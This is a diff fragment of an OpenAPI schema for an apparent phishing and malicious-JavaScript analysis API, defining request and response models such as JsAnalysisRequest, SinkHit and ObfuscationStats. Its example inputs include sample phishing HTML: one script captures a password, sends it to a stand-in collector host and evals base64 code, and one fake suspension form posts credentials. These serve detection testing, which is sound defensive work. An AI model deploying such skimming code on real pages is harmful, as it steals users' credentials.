+            "title": "Code"
+          }
+        },
+        "type": "object",
+        "required": [
+          "tag",
+          "attribute",
+          "code"
+        ],
+        "title": "JavascriptUrl"
+      },
+      "JsAnalysisRequest": {
+        "properties": {
+          "html": {
+            "type": "string",
+            "title": "Html",
+            "description": "the page's HTML (larger than 5 MB is truncated)"
+          },
+          "url": {
+            "anyOf": [
+              {
+                "type": "string",
+                "maxLength": 8192
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Url",
+            "description": "page address, never fetched"
+          }
+        },
+        "type": "object",
+        "required": [
+          "html"
+        ],
+        "title": "JsAnalysisRequest",
+        "description": "Input to ``POST /api/v1/js-analysis`` (same fields as /preprocess).",
+        "examples": [
+          {
+            "html": "<html><body><form id=\"login\"><input type=\"password\" id=\"password\"><button>Sign in</button></form><script>document.getElementById('login').addEventListener('submit', function (e) { e.preventDefault(); var pwd = document.getElementById('password').value; fetch('https://collector.example/c', {method: 'POST', body: JSON.stringify({p: pwd})}); window['eval'](atob('YWxlcnQoMSk='));});</script></body></html>",
+            "url": "https://bank.example/login"
+          },
+          {
+            "html": "<a href=\"javascript:location.replace('https://x.example/')\">go</a><body oncontextmenu=\"return false\">"
+          }
+        ]
+      },
+      "JsAnalysisResult": {
+        "properties": {
+          "meta": {
+            "$ref": "#/components/schemas/JsMeta"
+          },
+          "feature_set_version": {
+            "type": "string",
+            "title": "Feature Set Version"
+          },
+          "features": {
+            "additionalProperties": {
+              "anyOf": [
+                {
+                  "type": "number"
+                },
+                {
+                  "type": "integer"
+                }
+              ]
+            },
+            "type": "object",
+            "title": "Features"
+          },
+          "summary": {
+            "$ref": "#/components/schemas/JsSummary"
+          },
+          "scripts": {
+            "items": {
+              "$ref": "#/components/schemas/ScriptInfo"
+            },
+            "type": "array",
+            "title": "Scripts"
+          },
+          "external_scripts": {
+            "items": {
+              "$ref": "#/components/schemas/ExternalScriptInfo"
+            },
+            "type": "array",
+            "title": "External Scripts"
+          },
+          "detections": {
+            "items": {
+              "$ref": "#/components/schemas/Detection"
+            },
+            "type": "array",
+            "title": "Detections"
+          },
+          "counts": {
+            "items": {
+              "$ref": "#/components/schemas/ApiCount"
+            },
+            "type": "array",
+            "title": "Counts"
+          },
+          "limitations": {
+            "items": {
+              "type": "string"
+            },
+            "type": "array",
+            "title": "Limitations"
+          }
+        },
+        "additionalProperties": false,
+        "type": "object",
+        "required": [
+          "meta",
+          "feature_set_version",
+          "features",
+          "summary"
+        ],
+        "title": "JsAnalysisResult",
+        "description": "Part 7 output for one page: what its JavaScript uses, where, and how."
+      },
+      "JsMeta": {
+        "properties": {
+          "schema_version": {
+            "type": "string",
+            "title": "Schema Version",
+            "default": "js_v1"
+          },
+          "sample_id": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Sample Id"
+          },
+          "dataset_version": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Dataset Version"
+          },
+          "page_url": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Page Url"
+          },
+          "base_url": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Base Url"
+          },
+          "source_sha256": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Source Sha256"
+          },
+          "rules_hash": {
+            "type": "string",
+            "title": "Rules Hash"
+          },
+          "parser": {
+            "type": "string",
+            "title": "Parser"
+          },
+          "processing_ms": {
+            "type": "number",
+            "title": "Processing Ms",
+            "default": 0.0
+          },
+          "step_ms": {
+            "additionalProperties": {
+              "type": "number"
+            },
+            "type": "object",
+            "title": "Step Ms"
+          },
+          "errors": {
+            "items": {
+              "type": "string"
+            },
+            "type": "array",
+            "title": "Errors"
+          },
+          "warnings": {
+            "items": {
+              "type": "string"
+            },
+            "type": "array",
+            "title": "Warnings"
+          }
+        },
+        "additionalProperties": false,
+        "type": "object",
+        "required": [
+          "rules_hash",
+          "parser"
+        ],
+        "title": "JsMeta"
+      },
+      "JsSummary": {
+        "properties": {
+          "scripts_analyzed": {
+            "type": "integer",
+            "title": "Scripts Analyzed",
+            "default": 0
+          },
+          "scripts_lexical": {
+            "type": "integer",
+            "title": "Scripts Lexical",
+            "default": 0
+          },
+          "library_scripts": {
+            "type": "integer",
+            "title": "Library Scripts",
+            "default": 0
+          },
+          "detections_total": {
+            "type": "integer",
+            "title": "Detections Total",
+            "default": 0
+          },
+          "detections_page_own": {
+            "type": "integer",
+            "title": "Detections Page Own",
+            "default": 0
+          },
+          "detections_stored": {
+            "type": "integer",
+            "title": "Detections Stored",
+            "default": 0
+          },
+          "categories_page_own": {
+            "additionalProperties": {
+              "type": "integer"
+            },
+            "type": "object",
+            "title": "Categories Page Own"
+          },
+          "categories_library": {
+            "additionalProperties": {
+              "type": "integer"
+            },
+            "type": "object",
+            "title": "Categories Library"
+          },
+          "flags": {
+            "additionalProperties": {
+              "type": "boolean"
+            },
+            "type": "object",
+            "title": "Flags"
+          },
+          "libraries": {
+            "items": {
+              "type": "string"
+            },
+            "type": "array",
+            "title": "Libraries"
+          }
+        },
+        "additionalProperties": false,
+        "type": "object",
+        "title": "JsSummary",
+        "description": "Counts and yes/no flags over PAGE-OWN detections (library code excluded)."
+      },
+      "Link": {
+        "properties": {
+          "href_raw": {
+            "type": "string",
+            "title": "Href Raw"
+          },
+          "href_abs": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Href Abs"
+          },
+          "text": {
+            "type": "string",
+            "title": "Text",
+            "default": ""
+          },
+          "domain": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Domain"
+          },
+          "is_external": {
+            "type": "boolean",
+            "title": "Is External",
+            "default": false
+          },
+          "rel": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Rel"
+          },
+          "target": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Target"
+          }
+        },
+        "type": "object",
+        "required": [
+          "href_raw"
+        ],
+        "title": "Link",
+        "description": "One <a href>."
+      },
+      "MetaTag": {
+        "properties": {
+          "name": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Name"
+          },
+          "property": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Property"
+          },
+          "http_equiv": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Http Equiv"
+          },
+          "content": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Content"
+          },
+          "redirect_url": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Redirect Url"
+          }
+        },
+        "type": "object",
+        "title": "MetaTag"
+      },
+      "Modalities": {
+        "properties": {
+          "dom": {
+            "$ref": "#/components/schemas/ModalityResult"
+          },
+          "content": {
+            "$ref": "#/components/schemas/ModalityResult"
+          },
+          "behavior": {
+            "$ref": "#/components/schemas/ModalityResult"
+          }
+        },
+        "type": "object",
+        "required": [
+          "dom",
+          "content",
+          "behavior"
+        ],
+        "title": "Modalities"
+      },
+      "ModalityResult": {
+        "properties": {
+          "status": {
+            "type": "string",
+            "enum": [
+              "ok",
+              "failed",
+              "skipped"
+            ],
+            "title": "Status"
+          },
+          "reason": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Reason"
+          },
+          "summary": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Summary"
+          },
+          "top_evidence": {
+            "items": {
+              "type": "string"
+            },
+            "type": "array",
+            "title": "Top Evidence"
+          },
+          "arms": {
+            "items": {
+              "$ref": "#/components/schemas/ArmResult"
+            },
+            "type": "array",
+            "title": "Arms"
+          }
+        },
+        "type": "object",
+        "required": [
+          "status"
+        ],
+        "title": "ModalityResult",
+        "description": "dom / content / behavior: did it run, what did it say."
+      },
+      "ObfuscationStats": {
+        "properties": {
+          "chars": {
+            "type": "integer",
+            "title": "Chars"
+          },
+          "lines": {
+            "type": "integer",
+            "title": "Lines"
+          },
+          "avg_line_length": {
+            "type": "number",
+            "title": "Avg Line Length"
+          },
+          "max_line_length": {
+            "type": "integer",
+            "title": "Max Line Length"
+          },
+          "whitespace_ratio": {
+            "type": "number",
+            "title": "Whitespace Ratio"
+          },
+          "entropy": {
+            "type": "number",
+            "title": "Entropy"
+          },
+          "non_alnum_ratio": {
+            "type": "number",
+            "title": "Non Alnum Ratio"
+          },
+          "escape_ratio": {
+            "type": "number",
+            "title": "Escape Ratio"
+          },
+          "max_string_length": {
+            "type": "integer",
+            "title": "Max String Length"
+          },
+          "identifier_count": {
+            "type": "integer",
+            "title": "Identifier Count"
+          },
+          "avg_identifier_length": {
+            "type": "number",
+            "title": "Avg Identifier Length"
+          },
+          "single_char_identifier_ratio": {
+            "type": "number",
+            "title": "Single Char Identifier Ratio"
+          },
+          "hex_identifier_ratio": {
+            "type": "number",
+            "title": "Hex Identifier Ratio"
+          },
+          "string_array_size": {
+            "type": "integer",
+            "title": "String Array Size"
+          },
+          "minified": {
+            "type": "boolean",
+            "title": "Minified"
+          },
+          "signatures": {
+            "items": {
+              "type": "string"
+            },
+            "type": "array",
+            "title": "Signatures"
+          }
+        },
+        "additionalProperties": false,
+        "type": "object",
+        "required": [
+          "chars",
+          "lines",
+          "avg_line_length",
+          "max_line_length",
+          "whitespace_ratio",
+          "entropy",
+          "non_alnum_ratio",
+          "escape_ratio",
+          "max_string_length",
+          "identifier_count",
+          "avg_identifier_length",
+          "single_char_identifier_ratio",
+          "hex_identifier_ratio",
+          "string_array_size",
+          "minified"
+        ],
+        "title": "ObfuscationStats",
+        "description": "Descriptive statistics of one script (Part 8 judges, Part 7 only measures)."
+      },
+      "PageLanguage": {
+        "properties": {
+          "language": {
+            "type": "string",
+            "enum": [
+              "en",
+              "si",
+              "ta",
+              "si_latn",
+              "ta_latn",
+              "mixed",
+              "other",
+              "unknown"
+            ],
+            "title": "Language",
+            "default": "unknown"
+          },
+          "confidence": {
+            "type": "number",
+            "title": "Confidence",
+            "default": 0.0
+          },
+          "method": {
+            "type": "string",
+            "title": "Method",
+            "default": "none"
+          },
+          "backend": {
+            "type": "string",
+            "title": "Backend",
+            "default": "none"
+          },
+          "shares": {
+            "additionalProperties": {
+              "type": "number"
+            },
+            "type": "object",
+            "title": "Shares"
+          },
+          "script_ratios": {
+            "additionalProperties": {
+              "type": "number"
+            },
+            "type": "object",
+            "title": "Script Ratios"
+          },
+          "lang_attr": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Lang Attr"
+          }
+        },
+        "type": "object",
+        "title": "PageLanguage",
+        "description": "Page-level language: weighted by characters over the visible segments."
+      },
+      "PageMeta": {
+        "properties": {
+          "sample_id": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Sample Id"
+          },
+          "page_url": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Page Url"
+          },
+          "base_url": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Base Url"
+          },
+          "dataset_version": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Dataset Version"
+          },
+          "schema_version": {
+            "type": "string",
+            "title": "Schema Version",
+            "default": "1.0"
+          },
+          "parser_used": {
+            "type": "string",
+            "title": "Parser Used",
+            "default": "lxml"
+          },
+          "processing_ms": {
+            "type": "number",
+            "title": "Processing Ms",
+            "default": 0.0
+          },
+          "step_ms": {
+            "additionalProperties": {
+              "type": "number"
+            },
+            "type": "object",
+            "title": "Step Ms"
+          },
+          "html_size_bytes": {
+            "type": "integer",
+            "title": "Html Size Bytes",
+            "default": 0
+          },
+          "source_sha256": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Source Sha256"
+          },
+          "encoding": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Encoding"
+          },
+          "domain_method": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Domain Method"
+          },
+          "truncated": {
+            "type": "boolean",
+            "title": "Truncated",
+            "default": false
+          },
+          "truncation_reasons": {
+            "items": {
+              "type": "string"
+            },
+            "type": "array",
+            "title": "Truncation Reasons"
+          },
+          "errors": {
+            "items": {
+              "type": "string"
+            },
+            "type": "array",
+            "title": "Errors"
+          }
+        },
+        "type": "object",
+        "title": "PageMeta",
+        "description": "Where the page came from and how processing went."
+      },
+      "PageText": {
+        "properties": {
+          "meta": {
+            "$ref": "#/components/schemas/PageTextMeta"
+          },
+          "language": {
+            "$ref": "#/components/schemas/PageLanguage"
+          },
+          "segments": {
+            "items": {
+              "$ref": "#/components/schemas/TextSegment"
+            },
+            "type": "array",
+            "title": "Segments"
+          },
+          "counts": {
+            "additionalProperties": {
+              "type": "integer"
+            },
+            "type": "object",
+            "title": "Counts"
+          },
+          "chars": {
+            "type": "integer",
+            "title": "Chars",
+            "default": 0
+          },
+          "has_cta": {
+            "type": "boolean",
+            "title": "Has Cta",
+            "default": false
+          },
+          "has_form_labels": {
+            "type": "boolean",
+            "title": "Has Form Labels",
+            "default": false
+          },
+          "empty": {
+            "type": "boolean",
+            "title": "Empty",
+            "default": true
+          },
+          "page_text": {
+            "type": "string",
+            "title": "Page Text",
+            "default": ""
+          },
+          "page_text_chars": {
+            "type": "integer",
+            "title": "Page Text Chars",
+            "default": 0
+          },
+          "page_text_truncated": {
+            "type": "boolean",
+            "title": "Page Text Truncated",
+            "default": false
+          }
+        },
+        "type": "object",
+        "title": "PageText",
+        "description": "Everything Part 6 needs to read a page (text_v1)."
+      },
+      "PageTextMeta": {
+        "properties": {
+          "sample_id": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Sample Id"
+          },
+          "dataset_version": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Dataset Version"
+          },
+          "schema_version": {
+            "type": "string",
+            "title": "Schema Version",
+            "default": "text_v1"
+          },
+          "rules_hash": {
+            "type": "string",
+            "title": "Rules Hash",
+            "default": ""
+          },
+          "source_sha256": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Source Sha256"
+          },
+          "cta_source": {
+            "type": "string",
+            "enum": [
+              "html",
+              "parsed_page"
+            ],
+            "title": "Cta Source",
+            "default": "parsed_page"
+          },
+          "processing_ms": {
+            "type": "number",
+            "title": "Processing Ms",
+            "default": 0.0
+          },
+          "truncated": {
+            "type": "boolean",
+            "title": "Truncated",
+            "default": false
+          },
+          "truncation_reasons": {
+            "items": {
+              "type": "string"
+            },
+            "type": "array",
+            "title": "Truncation Reasons"
+          },
+          "dropped": {
+            "additionalProperties": {
+              "type": "integer"
+            },
+            "type": "object",
+            "title": "Dropped"
+          },
+          "errors": {
+            "items": {
+              "type": "string"
+            },
+            "type": "array",
+            "title": "Errors"
+          },
+          "warnings": {
+            "items": {
+              "type": "string"
+            },
+            "type": "array",
+            "title": "Warnings"
+          }
+        },
+        "type": "object",
+        "title": "PageTextMeta",
+        "description": "Where the text came from and how extraction went (no URLs: corpus files are shared)."
+      },
+      "ParsedPage": {
+        "properties": {
+          "meta": {
+            "$ref": "#/components/schemas/PageMeta"
+          },
+          "title": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Title"
+          },
+          "meta_description": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Meta Description"
+          },
+          "meta_keywords": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Meta Keywords"
+          },
+          "lang_attr": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Lang Attr"
+          },
+          "charset_declared": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Charset Declared"
+          },
+          "meta_tags": {
+            "items": {
+              "$ref": "#/components/schemas/MetaTag"
+            },
+            "type": "array",
+            "title": "Meta Tags"
+          },
+          "headings": {
+            "items": {
+              "$ref": "#/components/schemas/Heading"
+            },
+            "type": "array",
+            "title": "Headings"
+          },
+          "paragraphs": {
+            "items": {
+              "type": "string"
+            },
+            "type": "array",
+            "title": "Paragraphs"
+          },
+          "visible_text": {
+            "type": "string",
+            "title": "Visible Text",
+            "default": ""
+          },
+          "hidden_text": {
+            "type": "string",
+            "title": "Hidden Text",
+            "default": ""
+          },
+          "links": {
+            "items": {
+              "$ref": "#/components/schemas/Link"
+            },
+            "type": "array",
+            "title": "Links"
+          },
+          "forms": {
+            "items": {
+              "$ref": "#/components/schemas/Form"
+            },
+            "type": "array",
+            "title": "Forms"
+          },
+          "inputs_outside_forms": {
+            "items": {
+              "$ref": "#/components/schemas/InputField"
+            },
+            "type": "array",
+            "title": "Inputs Outside Forms"
+          },
+          "css": {
+            "$ref": "#/components/schemas/CssSummary"
+          },
+          "comments": {
+            "$ref": "#/components/schemas/CommentSummary"
+          },
+          "scripts_inline": {
+            "items": {
+              "$ref": "#/components/schemas/InlineScript"
+            },
+            "type": "array",
+            "title": "Scripts Inline"
+          },
+          "structured_data": {
+            "items": {
+              "$ref": "#/components/schemas/DataBlock"
+            },
+            "type": "array",
+            "title": "Structured Data"
+          },
+          "templates": {
+            "items": {
+              "$ref": "#/components/schemas/DataBlock"
+            },
+            "type": "array",
+            "title": "Templates"
+          },
+          "event_handlers": {
+            "items": {
+              "$ref": "#/components/schemas/EventHandler"
+            },
+            "type": "array",
+            "title": "Event Handlers"
+          },
+          "javascript_urls": {
+            "items": {
+              "$ref": "#/components/schemas/JavascriptUrl"
+            },
+            "type": "array",
+            "title": "Javascript Urls"
+          },
+          "scripts_external": {
+            "items": {
+              "$ref": "#/components/schemas/ExternalScript"
+            },
+            "type": "array",
+            "title": "Scripts External"
+          },
+          "embedded": {
+            "items": {
+              "$ref": "#/components/schemas/Embedded"
+            },
+            "type": "array",
+            "title": "Embedded"
+          },
+          "dom": {
+            "$ref": "#/components/schemas/DomSummary"
+          }
+        },
+        "type": "object",
+        "title": "ParsedPage",
+        "description": "Everything later parts need from one HTML page (facts only, no judgements)."
+      },
+      "PreprocessRequest": {
+        "properties": {
+          "html": {
+            "type": "string",
+            "title": "Html",
+            "description": "the page's HTML (larger than 5 MB is truncated)"
+          },
+          "url": {
+            "anyOf": [
+              {
+                "type": "string",
+                "maxLength": 8192
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Url",
+            "description": "page address, never fetched"
+          }
+        },
+        "type": "object",
+        "required": [
+          "html"
+        ],
+        "title": "PreprocessRequest",
+        "description": "Input to ``POST /api/v1/preprocess``: raw HTML and, optionally, where it came from.\n\n``url`` is only used to resolve relative links and decide internal vs\nexternal - it is NEVER fetched.",
+        "examples": [
+          {
+            "html": "<html><head><title>Verify your account</title></head><body><h1>Account suspended</h1><p>Sign in within 24 hours.</p><form action=\"https://collector.example/login.php\" method=\"post\"><input type=\"email\" name=\"email\"><input type=\"password\" name=\"pass\"><button>Sign in</button></form></body></html>",
+            "url": "https://bank.example/login"
+          },
+          {
+            "html": "<p>ශ්‍රී ලංකා - தமிழ் - English</p>"
+          }
+        ]
+      },
+      "ReadyResponse": {
+        "properties": {
+          "ready": {
+            "type": "boolean",
+            "title": "Ready"
+          },
+          "loading": {
+            "type": "boolean",
+            "title": "Loading",
+            "default": false
+          },
+          "reason": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Reason"
+          },
+          "xlmr_enabled": {
+            "type": "boolean",
+            "title": "Xlmr Enabled"
+          },
+          "arms": {
+            "additionalProperties": {
+              "additionalProperties": true,
+              "type": "object"
+            },
+            "type": "object",
+            "title": "Arms"
+          },
+          "model_versions": {
+            "additionalProperties": {
+              "anyOf": [
+                {
+                  "type": "string"
+                },
+                {
+                  "type": "null"
+                }
+              ]
+            },
+            "type": "object",
+            "title": "Model Versions"
+          },
+          "load_ms": {
+            "anyOf": [
+              {
+                "type": "number"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Load Ms"
+          }
+        },
+        "type": "object",
+        "required": [
+          "ready",
+          "xlmr_enabled"
+        ],
+        "title": "ReadyResponse",
+        "description": "``GET /ready``: are the models loaded (and which)."
+      },
+      "RejectedUrl": {
+        "properties": {
+          "index": {
+            "type": "integer",
+            "title": "Index"
+          },
+          "url": {
+            "type": "string",
+            "title": "Url"
+          },
+          "reason": {
+            "type": "string",
+            "title": "Reason"
+          }
+        },
+        "type": "object",
+        "required": [
+          "index",
+          "url",
+          "reason"
+        ],
+        "title": "RejectedUrl"
+      },
+      "ScanList": {
+        "properties": {
+          "items": {
+            "items": {
+              "$ref": "#/components/schemas/ScanSummary"
+            },
+            "type": "array",
+            "title": "Items"
+          },
+          "next_cursor": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Next Cursor"
+          }
+        },
+        "type": "object",
+        "required": [
+          "items"
+        ],
+        "title": "ScanList"
+      },
+      "ScanSummary": {
+        "properties": {
+          "id": {
+            "type": "integer",
+            "title": "Id"
+          },
+          "url": {
+            "type": "string",
+            "title": "Url"
+          },
+          "final_domain": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Final Domain"
+          },
+          "verdict": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Verdict"
+          },
+          "threat_class": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Threat Class"
+          },
+          "risk_score": {
+            "anyOf": [
+              {
+                "type": "integer"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Risk Score"
+          },
+          "status": {
+            "type": "string",
+            "title": "Status"
+          },
+          "language": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Language"
+          },
+          "source": {
+            "type": "string",
+            "enum": [
+              "user",
+              "threatradar_push",
+              "threatradar_pull",
+              "api"
+            ],
+            "title": "Source"
+          },
+          "demo": {
+            "type": "boolean",
+            "title": "Demo",
+            "default": false
+          },
+          "created_at": {
+            "type": "string",
+            "title": "Created At"
+          }
+        },
+        "type": "object",
+        "required": [
+          "id",
+          "url",
+          "status",
+          "source",
+          "created_at"
+        ],
+        "title": "ScanSummary",
+        "description": "One row of ``GET /api/v1/scans`` (and the live feed event)."
+      },
+      "ScriptInfo": {
+        "properties": {
+          "index": {
+            "type": "integer",
+            "title": "Index"
+          },
+          "source": {
+            "type": "string",
+            "enum": [
+              "inline",
+              "event_handler",
+              "javascript_url"
+            ],
+            "title": "Source"
+          },
+          "origin": {
+            "type": "string",
+            "title": "Origin"
+          },
+          "part2_index": {
+            "anyOf": [
+              {
+                "type": "integer"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Part2 Index"
+          },
+          "chars": {
+            "type": "integer",
+            "title": "Chars"
+          },
+          "analyzed_chars": {
+            "type": "integer",
+            "title": "Analyzed Chars"
+          },
+          "truncated": {
+            "type": "boolean",
+            "title": "Truncated",
+            "default": false
+          },
+          "parser": {
+            "type": "string",
+            "enum": [
+              "tree-sitter",
+              "lexical",
+              "skipped"
+            ],
+            "title": "Parser",
+            "default": "tree-sitter"
+          },
+          "parsed_ok": {
+            "type": "boolean",
+            "title": "Parsed Ok",
+            "default": true
+          },
+          "has_error": {
+            "type": "boolean",
+            "title": "Has Error",
+            "default": false
+          },
+          "error_ratio": {
+            "type": "number",
+            "title": "Error Ratio",
+            "default": 0.0
+          },
+          "timed_out": {
+            "type": "boolean",
+            "title": "Timed Out",
+            "default": false
+          },
+          "depth_capped": {
+            "type": "boolean",
+            "title": "Depth Capped",
+            "default": false
+          },
+          "parse_ms": {
+            "type": "number",
+            "title": "Parse Ms",
+            "default": 0.0
+          },
+          "library": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Library"
+          },
+          "detections": {
+            "type": "integer",
+            "title": "Detections",
+            "default": 0
+          },
+          "obfuscation": {
+            "anyOf": [
+              {
+                "$ref": "#/components/schemas/ObfuscationStats"
+              },
+              {
+                "type": "null"
+              }
+            ]
+          },
+          "note": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Note"
+          }
+        },
+        "additionalProperties": false,
+        "type": "object",
+        "required": [
+          "index",
+          "source",
+          "origin",
+          "chars",
+          "analyzed_chars"
+        ],
+        "title": "ScriptInfo",
+        "description": "One analysed piece of JavaScript (an inline script, a handler or a javascript: URL)."
+      },
+      "SeriesPoint": {
+        "properties": {
+          "t": {
+            "type": "string",
+            "title": "T"
+          },
+          "total": {
+            "type": "integer",
+            "title": "Total"
+          },
+          "flagged": {
+            "type": "integer",
+            "title": "Flagged"
+          }
+        },
+        "type": "object",
+        "required": [
+          "t",
+          "total",
+          "flagged"
+        ],
+        "title": "SeriesPoint"
+      },
+      "SinkHit": {
+        "properties": {
+          "id": {
+            "type": "integer",
+            "title": "Id"
+          },
+          "sink_id": {
+            "type": "string",
+            "title": "Sink Id"
+          },
+          "api": {
+            "type": "string",
+            "title": "Api"
+          },
+          "script_index": {
+            "type": "integer",
+            "title": "Script Index"
+          },
+          "line": {
+            "type": "integer",
+            "title": "Line"
+          },
+          "column": {
+            "type": "integer",
+            "title": "Column"
+          },
+          "code": {
+            "type": "string",
+            "title": "Code"
+          },
+          "url": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Url"
+          },
+          "url_domain": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Url Domain"
+          },
+          "is_external": {
+            "anyOf": [
+              {
+                "type": "boolean"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Is External"
+          },
+          "known_exfil_endpoint": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Known Exfil Endpoint"
+          },
+          "trigger": {
+            "type": "string",
+            "enum": [
+              "auto",
+              "user",
+              "unknown"
+            ],
+            "title": "Trigger",
+            "default": "unknown"
+          },
+          "trigger_reason": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Trigger Reason"
+          },
+          "confidence": {
+            "type": "string",
+            "enum": [
+              "high",
+              "medium",
+              "low"
+            ],
+            "title": "Confidence",
+            "default": "high"
+          }
+        },
+        "additionalProperties": false,
+        "type": "object",
+        "required": [
+          "id",
+          "sink_id",
+          "api",
+          "script_index",
+          "line",
+          "column",
+          "code"
+        ],
+        "title": "SinkHit",
+        "description": "A place page-own code sends / runs / writes data."
+      },
+      "SkeletonNode": {
+        "additionalProperties": true,
+        "type": "object"
+      },
+      "SourceHit": {
+        "properties": {
+          "id": {
+            "type": "integer",
+            "title": "Id"
+          },
+          "source_id": {
+            "type": "string",
+            "title": "Source Id"
+          },
+          "sensitivity": {
+            "type": "string",
+            "enum": [
+              "high",
+              "medium",
+              "low"
+            ],
+            "title": "Sensitivity"
+          },
+          "api": {
+            "type": "string",
+            "title": "Api"
+          },
+          "script_index": {
+            "type": "integer",
+            "title": "Script Index"
+          },
+          "line": {
+            "type": "integer",
+            "title": "Line"
+          },
+          "column": {
+            "type": "integer",
+            "title": "Column"
+          },
+          "code": {
+            "type": "string",
+            "title": "Code"
+          },
+          "detail": {
+            "anyOf": [
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Detail"
+          },
+          "confidence": {
+            "type": "string",
+            "enum": [
+              "high",
+              "medium",
+              "low"
+            ],
+            "title": "Confidence",
+            "default": "high"
+          }
+        },
+        "additionalProperties": false,
+        "type": "object",
+        "required": [
+          "id",
+          "source_id",
+          "sensitivity",
+          "api",
+          "script_index",
+          "line",
+          "column",
+          "code"
+        ],
+        "title": "SourceHit",
+        "description": "Sensitive data read by page-own code."
+      },
+      "SourceRef": {
+        "properties": {
+          "channel": {
+            "anyOf": [
+              {
+                "type": "string",
+                "maxLength": 200
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Channel"
+          },
+          "message_id": {
+            "anyOf": [
+              {
+                "type": "integer"
+              },
+              {
+                "type": "string"
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Message Id"
+          },
+          "subreddit": {
+            "anyOf": [
+              {
+                "type": "string",
+                "maxLength": 200
+              },
+              {
+                "type": "null"
+              }
+            ],
+            "title": "Subreddit"
+          },
